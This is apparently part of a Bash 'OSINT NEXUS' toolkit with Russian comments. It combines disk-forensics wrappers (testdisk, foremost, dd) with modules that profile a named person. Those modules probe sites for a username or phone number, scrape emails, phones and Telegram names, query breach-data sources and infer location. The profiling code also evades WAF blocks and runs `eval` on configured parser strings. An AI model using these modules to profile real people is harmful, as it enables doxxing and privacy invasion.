    # Запуск динамического контроллера для управления процессом
    if command -v prime_dynamic_controller >/dev/null; then
        prime_dynamic_controller "RECOVERY ENGINE [$dev_path]" "$options" "$opt_funcs"
    else
        core_engine_ui "e" "Dynamic controller is missing. Falling back to manual mode."
        # Резервный запуск простейшего восстановления
        run_foremost_logic "$dev_path"
    fi

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Recovery session started on device: $dev_path"
    
    # Слой 6: Синхронизация [13]
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v22.9 - HARDWARE PARTITION REPAIR MONOLITH
# @status: ISOLATED LOGGING & PRE-AUDIT AUTOMATION | PRODUCTION READY
# ==============================================================================
recover_partition_logic() {
    # 1. Защита ввода: верификация целевого устройства
    if [[ -z "$dev_path" || ! -b "$dev_path" ]]; then
        core_engine_ui "e" "Repair aborted: Target device [$dev_path] is not a valid block device."
        core_engine_wait
        return 1
    fi

    # 2. Валидация зависимости через Мозг [5]
    core_engine_validator "pkg" "testdisk" "TestDisk Recovery Tool" || return

    # 3. Подготовка изолированного криминалистического лога в LOOT [11]
    local timestamp=$(date +%s)
    local session_log="${LOOT_DIR}/testdisk_analysis_${timestamp}.log"
    
    core_engine_ui "!" "Launching Partition Repair Engine for [$dev_path]..."
    core_engine_ui "i" "Session Log will be isolated in: $(basename "$session_log")"
    core_engine_ui "i" "Recommended Strategy: [Analyze] -> [Quick Search] -> [Write]"

    # Переходим во временную папку, чтобы контролировать файлы, генерируемые утилитой
    local current_pwd=$(pwd)
    cd "/tmp" 2>/dev/null

    # 4. Слой автоматического пред-анализа структуры (Офлайн-снимок разметки)
    # Запускаем testdisk в неинтерактивном командном режиме для фиксации исходного состояния
    core_engine_ui "i" "Gathering initial partition architecture snapshot..."
    sudo testdisk /cmd "$dev_path" analyze 2>/dev/null
    
    if [[ -f "/tmp/testdisk.log" ]]; then
        echo "=== INITIAL SECTOR ARCHITECTURE SNAPSHOT ===" > "$session_log"
        cat "/tmp/testdisk.log" >> "$session_log"
        rm -f "/tmp/testdisk.log"
    fi

    # Слой 5: Прямое интерактивное взаимодействие с оборудованием
    sleep 1
    core_engine_ui "!" "Opening Interactive Hardware Session. Focus console..."
    
    # Запуск TestDisk. Флаг /log заставляет его писать текущие действия в новый файл
    sudo testdisk /log "$dev_path"

    # 6. Пост-обработка и Сбор трофеев [11]
    if [[ -f "/tmp/testdisk.log" ]]; then
        echo -e "\n=== INTERACTIVE REPAIR SESSION LOG ===" >> "$session_log"
        cat "/tmp/testdisk.log" >> "$session_log"
        rm -f "/tmp/testdisk.log"
    fi

    # Возвращаем рабочую директорию на место
    cd "$current_pwd" 2>/dev/null

    if [[ -s "$session_log" ]]; then
        core_engine_ui "s" "[+] Partition Repair Session closed. Comprehensive audit log secured."
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "forensics" "Partition table audit/repair completed for $dev_path. Log: $session_log"
    else
        core_engine_ui "w" "Session closed, but no audit data was generated."
        rm -f "$session_log"
    fi

    core_engine_wait
}




# ==============================================================================
# @description: OSINT NEXUS v22.8 - FORENSIC DATA CARVING MONOLITH (FOREMOST)
# @status: ADVANCED ANALYTICS & UNIVERSAL INPUT | PRODUCTION READY
# ==============================================================================
run_foremost_logic() {
    local target_source="$1"
    
    # 1. Автоматический выбор источника (Аргумент -> Глобальный dev_path -> Падение)
    [[ -z "$target_source" ]] && target_source="$dev_path"
    if [[ -z "$target_source" || (! -b "$target_source" && ! -f "$target_source") ]]; then
        core_engine_ui "e" "Carving aborted: Target [$target_source] is not a valid block device or .img file."
        core_engine_wait
        return 1
    fi

    # 2. Валидация зависимости
    core_engine_validator "pkg" "foremost" "Foremost Carving Tool" || return

    # 3. Подготовка стерильного сектора в LOOT
    local rec_dir="${LOOT_DIR}/recovered_$(date +%s)"
    mkdir -p "$rec_dir"
    
    core_engine_ui "i" "Nexus Foremost: Launching Deep RAW Sector Analysis..."
    core_engine_ui "!" "Analyzing: $target_source -> Target Sandbox: $rec_dir"
    
    # Слой 4: Процесс извлечения (Режим 'all' для извлечения всех доступных сигнатур)
    # Использование ключа -q (Quick) ускоряет поиск по известным границам секторов
    sudo foremost -v -q -t all -i "$target_source" -o "$rec_dir" 2>/tmp/foremost_exec.log

    # 5. ИНТЕЛЛЕКТУАЛЬНЫЙ АНАЛИЗ РЕЗУЛЬТАТОВ (Пост-обработка)
    if [[ -d "$rec_dir" ]]; then
        # Удаляем пустые папки, которые foremost создает по умолчанию, чтобы не путаться
        find "$rec_dir" -type d -empty -delete 2>/dev/null
        
        # Подсчет общего количества восстановленных файлов
        local total_files=$(find "$rec_dir" -type f | wc -l)
        
        if (( total_files > 0 )); then
            core_engine_ui "s" "[+] Deep Carving Complete! Successfully recovered $total_files artifacts."
            
            # Генерация красивой сводной таблицы на экран
            echo -e "\n--- RECOVERED ARTIFACTS MANIFEST ---"
            local ext_dir
            for ext_dir in "$rec_dir"/*/; do
                if [[ -d "$ext_dir" ]]; then
                    local type_name=$(basename "$ext_dir")
                    local count=$(find "$ext_dir" -type f | wc -l)
                    echo -e "  * [Category: ${type_name^^}] -> Extracted: $count files"
                fi
            done
            echo -e "-------------------------------------\n"
            
            # Регистрация результатов в Сборщике трофеев [11]
            core_engine_loot "forensics" "Deep Carving complete for $target_source. Total items: $total_files -> Path: $rec_dir"
        else
            core_engine_ui "w" "Carving finished, but zero signatures were matched. Target sectors might be zeroed or encrypted."
            rm -rf "$rec_dir"
        fi
    else
        core_engine_ui "e" "Foremost execution failed. Check system logs."
    fi
    
    rm -f /tmp/foremost_exec.log
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v22.7 - LOW-LEVEL FORENSIC DISK DUMP MONOLITH
# @status: SAFETY-ENFORCED & INTEGRITY-VERIFIED | PRODUCTION READY
# ==============================================================================
run_dd_logic() {
    # 1. Защита ввода: верификация целевого устройства
    if [[ -z "$dev_path" || ! -b "$dev_path" ]]; then
        core_engine_ui "e" "Dump aborted: Target device [$dev_path] is not a valid block device."
        core_engine_wait
        return 1
    fi

    # 2. Интеллектуальный расчет свободного дискового пространства
    local dev_size_bytes=$(sudo blockdev --getsize64 "$dev_path" 2>/dev/null)
    local loot_dir_free_kb=$(df -P "${LOOT_DIR}" | tail -1 | awk '{print $4}')
    local loot_dir_free_bytes=$((loot_dir_free_kb * 1024))

    if (( dev_size_bytes >= loot_dir_free_bytes )); then
        local needed_gb=$(echo "scale=2; $dev_size_bytes / 1024 / 1024 / 1024" | bc 2>/dev/null)
        core_engine_ui "e" "Dump aborted: Insufficient storage in LOOT_DIR. Requires ~${needed_gb} GB."
        core_engine_wait
        return 1
    fi

    # 3. Подготовка структуры файлов
    local base_filename="disk_backup_$(date +%s)"
    local img_file="${LOOT_DIR}/${base_filename}.img"
    local hash_file="${LOOT_DIR}/${base_filename}.sha256"
    
    core_engine_ui "!" "Creating binary image dump... CRITICAL: DO NOT UNPLUG DEVICE!"
    core_engine_ui "i" "Device Size: $((dev_size_bytes / 1024 / 1024)) MB | Target: $img_file"

    # Слой 4: Посекторное копирование с параллельным расчетом SHA-256 через tee
    # Это позволяет за один проход диска и записать образ, и посчитать его хэш
    sudo dd if="$dev_path" bs=4M conv=noerror,sync status=progress 2>/tmp/dd_progress.tmp | tee "$img_file" | sha256sum | awk '{print $1}' > "$hash_file"

    # 5. Валидация результата и фиксация целостности
    if [[ -s "$img_file" && -s "$hash_file" ]]; then
        local final_hash=$(cat "$hash_file")
        core_engine_ui "s" "Image secured: $(basename "$img_file")"
        core_engine_ui "s" "[+] SHA-256 Integrity Verified: $final_hash"
        core_engine_ui "i" "You can now run Foremost or Sleuthkit on this .img file for offline analysis."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "storage" "Forensic dump: $img_file | Hash: $final_hash"
    else
        core_engine_ui "e" "Dump failed or output corrupted. Check target storage permissions."
        rm -f "$img_file" "$hash_file"
    fi
    
    rm -f /tmp/dd_progress.tmp
    core_engine_wait
}


run_osint_custom_socialscan() {
    local input_target="$1"
    local raw_log="$2"
    [[ -z "$input_target" ]] && input_target="$target_user"
    
    # 1. Защита и диспетчеризация
    if is_valid "$input_target" "GLOBAL_PLATFORM_SYSTEM_ROUTES"; then return 1; fi
    local target_type="NICK"
    [[ "$input_target" =~ ${GLOBAL_EMAIL_MATRIX[0]} ]] && target_type="EMAIL"
    
    # 2. Параллельный движок (из v20.0)
    local max_parallel_jobs=12
    local tmp_scan="/tmp/nexus_social_$$"
    
    for site_entry in "${GLOBAL_OSINT_SITES[@]}"; do
        # Деструктуризация (как в v20.0)
        local base_url="${site_entry%%|*}"; local rem="${site_entry#*|}"
        local check_type="${rem%%|*}"; rem="${rem#*|}"
        local error_marker="${rem%%|*}"; local site_name="${rem##*|}"
        local full_url="${base_url}${input_target}"

        (
            # Логика проверки (из v25.5)
            local account_exists=0
            if [[ "$check_type" == "HTTP_CODE" ]]; then
                [[ "$(curl -s -o /dev/null -I -L -A "$GLOBAL_NETWORK_UA" --connect-timeout 3 -w "%{http_code}" "$full_url")" == "200" ]] && account_exists=1
            elif [[ "$check_type" == "TEXT_ABSENT" ]]; then
                local page_body=$(curl -s -L -A "$GLOBAL_NETWORK_UA" --connect-timeout 4 "$full_url" 2>/dev/null)
                [[ -n "$page_body" && ! "$page_body" =~ "$error_marker" ]] && account_exists=1
            fi

            # Экстракция артефактов (из v25.5)
            if (( account_exists == 1 )); then
                echo "[MATCH_$target_type] $site_name -> $full_url" >> "$tmp_scan"
                local page_data=$(curl -s -L -A "$GLOBAL_NETWORK_UA" "$full_url" 2>/dev/null)
                echo "$page_data" | grep -oE "${GLOBAL_EMAIL_MATRIX[0]}" >> "/tmp/nexus_emails.tmp" 2>/dev/null
                echo "$page_data" | grep -oE "${GLOBAL_PRIME_MATRIX[0]}|${GLOBAL_PRIME_MATRIX[3]}" >> "/tmp/nexus_phones.tmp" 2>/dev/null
            fi
        ) &

        # Управление пулом (Sliding Window)
        while (( $(jobs -p | wc -l) >= max_parallel_jobs )); do sleep 0.05; done
    done
    wait
    
    # 3. Финализация
    cat "$tmp_scan" >> "$raw_log"
    rm -f "$tmp_scan"
}


# ==============================================================================
# @description: OSINT NEXUS v26.0 - INTEGRATED BREACH INTEL HUB
# @status: LOCAL PARALLEL SCAN + DYNAMIC API BREACH VECTOR MAPPING
# ==============================================================================
run_osint_custom_leaks() {
    local leak_target="$1"
    local raw_log="$2"
    
    [[ -z "$leak_target" ]] && leak_target="$target_user"
    [[ -z "$leak_target" ]] && return 1

    local clean_target=$(echo "$leak_target" | tr -d '[:space:]')
    core_engine_ui "h" "BREACH INTEL: ANALYZING [$clean_target]"

    # 1. ЛОКАЛЬНЫЙ ПОИСК (Параллельный контур)
    core_engine_ui "i" "Executing high-speed parallel local disk signature scan..."
    local sandbox_dir="/tmp/nexus_leaks_$$"
    mkdir -p "$sandbox_dir"
    
    local search_dirs=("$HOME/arsenal_loot" "$HOME/prime_loot" "$HOME/reports")
    for dir in "${search_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            find "$dir" -type f 2>/dev/null | xargs -P 4 -I {} grep -ih "$clean_target" "{}" 2>/dev/null | \
            grep -v "BREACH REPORT" | head -n 50 >> "$sandbox_dir/matches.raw"
        fi
    done

    # 2. ГЛОБАЛЬНЫЙ API-КАСКАД (Breach Intelligence)
    core_engine_ui "i" "Querying GLOBAL_API_BREACH_NODES for external intelligence..."
    for node in "${GLOBAL_API_BREACH_NODES[@]}"; do
        local url_tpl="${node%%|*}"; local remaining="${node#*|}"
        local method="${remaining%%|*}"; remaining="${remaining#*|}"
        local type="${remaining%%|*}"; remaining="${remaining#*|}"
        local vector="${remaining%%|*}"; local node_name="${remaining##*|}"

        # Проверка вектора (если узел требует только EMAIL, а таргет - телефон, пропускаем)
        [[ "$vector" != "ALL" && "$vector" != "$target_type" ]] && continue

        local target_url="${url_tpl//\{TARGET\}/$clean_target}"
        
        # Запрос к API
        local response=$(curl -s -X "$method" -A "$GLOBAL_NETWORK_UA" --connect-timeout 3 "$target_url")
        
        if [[ -n "$response" && "$response" != *"error"* ]]; then
            echo "[API_MATCH] Node: $node_name -> $response" >> "$raw_log"
            core_engine_ui "s" "[+] External breach data acquired from $node_name"
        fi
    done

    # 3. АГРЕГАЦИЯ И ИНТЕГРАЦИЯ
    if [[ -s "$sandbox_dir/matches.raw" ]]; then
        while IFS= read -r line; do
            echo "[BREACH_MATCH] $line" >> "$raw_log"
            # Экстракция артефактов через новые глобальные матрицы
            echo "$line" | grep -oE "${GLOBAL_EMAIL_MATRIX[0]}" >> "/tmp/nexus_emails.tmp"
            echo "$line" | grep -oE "${GLOBAL_PRIME_MATRIX[0]}|${GLOBAL_PRIME_MATRIX[3]}" >> "/tmp/nexus_phones.tmp"
        done < "$sandbox_dir/matches.raw"
        core_engine_ui "s" "[!] Breach intelligence consolidated."
    fi

    rm -rf "$sandbox_dir"
}


# ==============================================================================
# @description: OSINT NEXUS v22.5 - HIGH-PERFORMANCE PHONE RESOLVER (ASYNC)
# @status: ASYNCHRONOUS MULTI-THREADING | PRODUCTION READY
# ==============================================================================
run_osint_custom_ignorant() {
    local phone="$1"
    local raw_log="$2"

    [[ -z "$phone" ]] && phone="$target_user"
    [[ -z "$phone" ]] && return 1

    # 1. Нормализация (очистка вектора)
    phone=$(echo "$phone" | tr -dc '0-9')
    
    # 2. Валидация
    if ! is_valid "$phone" "GLOBAL_REGEX_PHONE_VALID"; then
        return 1
    fi

    core_engine_ui "i" "Nexus PhoneResolver: Parallel Multi-Vector Audit for [+$phone]..."

    local sandbox_dir="/tmp/nexus_resolver_$$"
    mkdir -p "$sandbox_dir"

    # --- ЗАПУСК ПАРАЛЛЕЛЬНОГО СКАНИРОВАНИЯ ---
    for service_entry in "${GLOBAL_PHONE_SERVICES[@]}"; do
        [[ "$service_entry" != *"|"* ]] && continue
        
        (
            IFS='|' read -r base_url check_type criteria category service_name <<< "$service_entry"
            local full_url="${base_url}${phone}"
            local selected_ua="${GLOBAL_NETWORK_UA[$(( RANDOM % ${#GLOBAL_NETWORK_UA[@]} ))]}"
            local service_confirmed=0

            # Запрос с проверкой на WAF (Адаптировано под новую матрицу)
            local page_body=$(curl -s -L -A "$selected_ua" --connect-timeout 5 "$full_url" 2>/dev/null)
            
            # Используем ваш новый реестр блокировок
            if [[ -n "$page_body" ]] && ! check_for_waf_blocks "$page_body"; then
                
                # Логика диспетчеризации
                case "$check_type" in
                    "HTTP_CODE")
                        local http_code=$(curl -s -o /dev/null -I -L -A "$selected_ua" --connect-timeout 4 -w "%{http_code}" "$full_url" 2>/dev/null)
                        [[ "$http_code" == "$criteria" ]] && service_confirmed=1
                        ;;
                    "DOM_MATCH")
                        [[ "$page_body" == *"$criteria"* ]] && service_confirmed=1
                        ;;
                    "DOM_ABSENT")
                        [[ ! "$page_body" == *"$criteria"* ]] && service_confirmed=1
                        ;;
                esac

                if (( service_confirmed == 1 )); then
                    echo "[MATCH_PHONE] $service_name -> $full_url" >> "$sandbox_dir/results.log"
                    
                    # Глубокий анализ Telegram
                    if [[ "$service_name" == "Telegram" ]]; then
                        local meta_name=$(echo "$page_body" | grep -oP "meta property=\"og:title\" content=\"\K[^\"]+" 2>/dev/null)
                        [[ -n "$meta_name" ]] && echo "[PHONE_META] Telegram_Name -> $meta_name" >> "$sandbox_dir/results.log"
                        echo "$page_body" | grep -oE "$GLOBAL_REGEX_EMAIL" >> "/tmp/nexus_found_emails.tmp" 2>/dev/null
                    fi
                fi
            else
                # Если сработал WAF — помечаем в лог для контроля "здоровья" сети
                echo "[WAF_ALERT] $service_name blocked connection." >> "$sandbox_dir/results.log"
            fi
        ) &
    done

    wait

    # --- СБОР РЕЗУЛЬТАТОВ ---
    if [[ -f "$sandbox_dir/results.log" ]]; then
        cat "$sandbox_dir/results.log" >> "$raw_log"
        while IFS= read -r line; do
            [[ "$line" == *"[MATCH_PHONE]"* ]] && core_engine_ui "s" "[+] Linked: $(echo "$line" | awk '{print $2}') (Artifacts saved)"
            [[ "$line" == *"[WAF_ALERT]"* ]] && core_engine_ui "w" "[!] WAF prevented scan on: $(echo "$line" | awk '{print $2}')"
        done < "$sandbox_dir/results.log"
    fi

    rm -rf "$sandbox_dir"
    core_engine_ui "s" "[+] PhoneResolver: Multi-vector audit cycle finished."
}


# ==============================================================================
# @description: OSINT NEXUS v22.4 - HIGH-PERFORMANCE ASYNC OMNI-CRAWLER
# @status: ASYNCHRONOUS MULTI-THREADING | PRODUCTION READY
# ==============================================================================
run_osint_omni_crawler() {
    local user_input="$1"
    local raw_log="$2"

    # 1. Инициализация и нормализация
    [[ -z "$user_input" ]] && user_input="$target_user"
    [[ -z "$user_input" ]] && return 1

    # RESOLVER: Раскрытие коротких ссылок
    if echo "$user_input" | grep -qP "$GLOBAL_SHORT_LINK_REDIRECT_REGEX" 2>/dev/null; then
        user_input=$(curl -s -I -L -A "$GLOBAL_NETWORK_UA" --connect-timeout 3 "$user_input" 2>/dev/null | grep -i "^location:" | tail -n 1 | awk '{print $2}' | tr -d '\r')
    fi

    local target_user=$(echo "$user_input" | cut -d'?' -f1 | cut -d'/' -f1 | tr -d '[:space:]@')
    [[ -z "$target_user" ]] || is_valid "$target_user" "GLOBAL_PLATFORM_SYSTEM_ROUTES" && return 1

    core_engine_ui "i" "Nexus OmniCrawler: Launching Parallel Multithreaded Scan..."

    local query_vectors=("${target_user}+phone" "${target_user}+contact" "${target_user}+gmail" "site:facebook.com+${target_user}")
    local sandbox_dir="/tmp/nexus_threads_$$"
    mkdir -p "$sandbox_dir"

    # --- ЗАПУСК ПАРАЛЛЕЛЬНЫХ ПОТОКОВ ---
    for vector in "${query_vectors[@]}"; do
        for engine_entry in "${GLOBAL_SEARCH_ENGINES[@]}"; do
            [[ "$engine_entry" != *"|"* ]] && continue
            
            (
                local engine_name="${engine_entry%%|*}"
                local request_url="${engine_entry#*|}"
                request_url="${request_url//%VECTOR%/$vector}"
                
                # Запрос с использованием вашего реестра анти-флуда
                local raw_data=$(curl -s -A "$GLOBAL_NETWORK_UA" --connect-timeout 5 "$request_url" 2>/dev/null)
                
                # Интеллектуальная проверка: не является ли ответ блокировкой
                if [[ -n "$raw_data" ]] && ! check_for_waf_blocks "$raw_data"; then
                    # Экстракция данных в изолированный файл потока
                    echo "$raw_data" | grep -oE "$GLOBAL_REGEX_PHONE_SEARCH" >> "$sandbox_dir/phones.raw" 2>/dev/null
                    echo "$raw_data" | grep -oP "$GLOBAL_REGEX_EMAIL" >> "$sandbox_dir/emails.raw" 2>/dev/null
                    
                    echo "[$(date "+%Y-%m-%d %H:%M:%S")] [MATCH_CRAWLER] Engine:$engine_name -> Vector:$vector" >> "$raw_log"
                else
                    echo "[$(date "+%Y-%m-%d %H:%M:%S")] [WAF_BLOCK] Engine:$engine_name -> Vector:$vector" >> "$raw_log"
                fi
            ) &
        done
    done

    wait
    
    # --- СБОР И АНАЛИТИКА ---
    local unique_phones=0
    local unique_emails=0

    [[ -f "$sandbox_dir/phones.raw" ]] && { sort -u "$sandbox_dir/phones.raw" >> "/tmp/nexus_found_phones.tmp" 2>/dev/null; unique_phones=$(sort -u "$sandbox_dir/phones.raw" | wc -l); }
    [[ -f "$sandbox_dir/emails.raw" ]] && { sort -u "$sandbox_dir/emails.raw" >> "/tmp/nexus_found_emails.tmp" 2>/dev/null; unique_emails=$(sort -u "$sandbox_dir/emails.raw" | wc -l); }

    rm -rf "$sandbox_dir"
    core_engine_ui "s" "[+] OmniCrawler: Parallel scan complete. Extracted: $unique_phones phones, $unique_emails emails."
}




# 2. ФУНКЦИЯ ОБНОВЛЕНИЯ (APT + INTEGRITY CHECK)
run_sys_update() {
    echo "[*] Phase 1: apt sync & upgrade..."
    if command -v apt &>/dev/null; then
        apt update && apt upgrade -y && apt autoremove -y
    fi
    echo "[+] System upgrade finalized."
}

# 3. ФОРЕНЗИК-ХАРВЕСТЕР (Forensic Artifact Harvester)
# Собирает состояние системы в момент обнаружения угрозы
run_forensic_harvest() {
    local log_file="nexus_forensic_$(date +%Y%m%d_%H%M%S).log"
    echo "[!] ALERT: Threat detected. Harvesting artifacts..."
    
    {
        echo "--- ARTIFACT SNAPSHOT: $(date) ---"
        echo "[PROCESSES]"
        ps aux | grep -vE "$GLOBAL_REGEX_PROC_WHITELIST" | head -n 10
        echo "[NETWORK CONNECTIONS]"
        netstat -tulnp 2>/dev/null
        echo "[OPEN FILES]"
        lsof -i 2>/dev/null | head -n 10
    } > "$log_file"
    
    echo "[+] Artifacts saved to $log_file"
}


# ==============================================================================
# @description: OSINT NEXUS v26.1 - GEO-INTELLIGENCE MODULE
# @status: BETA | INTEGRATED WITH IP-GEOLOCATION & OSINT-ASSOCIATION
# ==============================================================================

# ==============================================================================
# @matrix: GLOBAL_GEO_NODES v3.0 (ULTIMATE GEO-INTEL)
# Формат: "URL|TYPE|PROVIDER_NAME|PARSER_COMMAND"
# ==============================================================================
GLOBAL_GEO_NODES=(
    "https://ipapi.co/{TARGET}/json/|IP|ipapi.co|jq -r '.city, .region, .country_name, .asn'"
    "https://ip-api.com/json/{TARGET}?fields=status,message,country,regionName,city,lat,lon,isp,proxy|IP|ip-api.com|jq -r '.city, .lat, .lon, .isp, .proxy'"
    "https://api.iplocation.net/?ip={TARGET}|IP|iplocation.net|jq -r '.country_name, .isp'"
)

# ==============================================================================
# @description: OSINT NEXUS v27.0 - GEOSPATIAL INTELLIGENCE CORE
# @status: FULL-STACK GEO-CORRELATION | PRODUCTION READY
# ==============================================================================
run_geo_lookup() {
    local target="$1"
    [[ -z "$target" ]] && return 1

    core_engine_ui "h" "GEO-INTEL CORE: MAPPING [$target]"

    # 1. IP-VECTOR: Глубокая декомпозиция
    if [[ "$target" =~ ${GLOBAL_INFRA_MATRIX[0]} ]]; then
        core_engine_ui "i" "Performing multi-node IP triangulation..."
        
        for node in "${GLOBAL_GEO_NODES[@]}"; do
            local url_tpl="${node%%|*}"; local remaining="${node#*|}"
            local type="${remaining%%|*}"; remaining="${remaining#*|}"
            local name="${remaining%%|*}"; local parser="${remaining##*|}"
            
            [[ "$type" != "IP" ]] && continue
            
            local url="${url_tpl//\{TARGET\}/$target}"
            local response=$(curl -s -L -A "$GLOBAL_NETWORK_UA" --connect-timeout 5 "$url")
            
            if [[ -n "$response" ]]; then
                echo "[GEO_MATCH] Source: $name" >> "/tmp/nexus_geo.log"
                # Используем jq для точечного извлечения данных
                local parsed=$(echo "$response" | eval "$parser")
                echo "$parsed" | sed 's/^/    [DATA]: /'
            fi
        done
    
    # 2. SOCIAL-VECTOR: Корреляционный поиск
    else
        core_engine_ui "i" "Running Social-Geo correlation..."
        # Запуск сканирования и последующий парсинг найденных данных на упоминания городов/регионов
        run_osint_custom_socialscan "$target" "/tmp/nexus_geo_association.log"
        
        # Поиск упоминаний локаций в найденных данных
        core_engine_ui "i" "Scanning for location artifacts in digital footprint..."
        grep -Ei "(city|location|address|region|from|living in|в городе|живу в)" "/tmp/nexus_geo_association.log" | head -n 10
    fi
    
    core_engine_ui "s" "Geo-Intelligence lookup finished."
}



# ==========================================
# 3. ОСНОВНОЙ ЦИКЛ (CORE LOOP)
# ==========================================
# --- Точка входа ---


# --- ГЛАВНОЕ МЕНЮ (ПОЛНЫЙ КОМПЛЕКТ v13.8) ---
run_dynamic_menu() {
    local target_key="$1"
    local menu_title="$2"
    
    # Визуальный отклик для тяжелых секторов
    [[ "$target_key" == "STEALTH_COMMS" || "$target_key" == "NEXUS" ]] && core_engine_progress 1 "$target_key"
    
    core_engine_ui "h" "$menu_title"
    
    local -a labels=()
    local -a actions=()
    
    # Поиск по матрице
    for entry in "${GLOBAL_MENU_REGISTRY[@]}"; do
        if [[ "$entry" == "$target_key:"* ]]; then
            local clean_entry="${entry#*:}"
            labels+=("${clean_entry%|*}")
            actions+=("${clean_entry#*|}")
        fi
    done
    
    # Защита от пустого меню
    if [ ${#labels[@]} -eq 0 ]; then
        core_engine_ui "e" "CRITICAL: Menu sector '$target_key' is empty or invalid!"
        core_engine_wait
        return 1
    fi
    
    # Передача в контроллер
    prime_dynamic_controller "$menu_title" "${labels[*]}" "${actions[*]}"
}

# --- УНИВЕРСАЛЬНЫЙ РЕНДЕРЕР МЕНЮ ---
run_dynamic_menu() {
    local target_key="$1"
    local menu_title="$2"
    
    # Визуальный отклик для тяжелых секторов
    [[ "$target_key" == "STEALTH_COMMS" || "$target_key" == "NEXUS" ]] && core_engine_progress 1 "$target_key"
    
    core_engine_ui "h" "$menu_title"
    
    local -a labels=()
    local -a actions=()
    
    # Парсинг матрицы
    for entry in "${GLOBAL_MENU_REGISTRY[@]}"; do
        if [[ "$entry" == "$target_key:"* ]]; then
            local clean_entry="${entry#*:}"
            labels+=("${clean_entry%|*}")
            actions+=("${clean_entry#*|}")
        fi
    done
    
    # Защита от ошибок
    if [ ${#labels[@]} -eq 0 ]; then
        core_engine_ui "e" "CRITICAL: Menu sector '$target_key' is empty!"
        core_engine_wait
        return 1
    fi
    
    prime_dynamic_controller "$menu_title" "${labels[*]}" "${actions[*]}"
}

# --- ЛЕГКИЕ ОБЕРТКИ ---
menu_intelligence()    { run_dynamic_menu "INTELLIGENCE" "SECTOR I: INTELLIGENCE & OSINT"; }
menu_system_core()     { run_dynamic_menu "SYSTEM" "SYSTEM CORE: MAINTENANCE & INFO"; }
menu_forensics()       { run_dynamic_menu "FORENSICS" "SECTOR F: DATA FORENSICS & RECOVERY"; }
menu_cyber_ops()       { run_dynamic_menu "CYBER_OPS" "CYBER OPERATIONS SECTOR"; }
menu_crypto_lab()      { run_dynamic_menu "CRYPTO_LAB" "SECTOR C: CRYPTOGRAPHY & STEGANOGRAPHY"; }
menu_net_infra()       { run_dynamic_menu "NET_INFRA" "NETWORK INFRASTRUCTURE"; }
menu_core_lab()        { run_dynamic_menu "CORE_LAB" "CORE RESEARCH LAB"; }
menu_financial_shield(){ run_dynamic_menu "FIN_SHIELD" "FINANCIAL SHIELD: BANKING GAMBIT"; }
menu_stealth_comms()   { run_dynamic_menu "STEALTH_COMMS" "STEALTH COMMS HUB"; }
menu_nexus_correlation(){ run_dynamic_menu "NEXUS" "SECTOR N: NEXUS ANALYSIS & CORRELATION"; }
run_main_menu()        { run_dynamic_menu "MAIN" "PRIME MASTER EXECUTIVE v$CURRENT_VERSION"; }

# --- ТОЧКА ЗАПУСКА ---
clear
run_main_menu
